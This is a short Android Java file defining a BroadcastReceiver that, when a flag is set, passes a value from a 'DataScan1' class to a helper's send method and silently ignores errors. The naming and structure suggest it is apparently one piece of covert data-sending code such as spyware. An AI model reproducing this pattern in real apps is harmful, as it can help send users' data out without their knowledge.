package store.apps;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class ReceversAnalys extends BroadcastReceiver {


    @Override
    public void onReceive(Context ctx, Intent i) {
        if(ConHelpOne.echo){
            try
            {
                ConHelpOne._send_mthd_(DataScan1.jz,String.valueOf(DataScan1.ju).getBytes());
            }catch (Exception SS){




                 }


        }
    }

}